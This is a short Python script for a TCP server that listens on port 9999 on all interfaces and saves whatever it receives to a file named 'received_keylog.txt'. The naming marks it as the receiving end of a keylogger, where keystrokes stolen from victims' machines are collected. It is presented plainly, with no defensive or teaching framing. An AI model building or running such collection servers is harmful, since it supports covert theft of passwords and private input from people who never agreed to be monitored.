import socket

# Configuration
server_ip = "0.0.0.0"  # Listen on all available interfaces
server_port = 9999      # Port to listen on
output_file = "received_keylog.txt"  # File to save the received data

def start_server():
    # Create a TCP socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((server_ip, server_port))
        server_socket.listen(5)
        print(f"Server listening on {server_ip}:{server_port}...")

        while True:
            # Wait for a connection
            client_socket, client_address = server_socket.accept()
            print(f"Connection from {client_address} established.")

            with client_socket, open(output_file, 'wb') as f:
                while True:
                    # Receive data in chunks
                    data = client_socket.recv(1024)
                    if not data:
                        break
                    # Write received data to the file
                    f.write(data)

            print(f"File received and saved as {output_file}.")

if __name__ == "__main__":
    start_server()
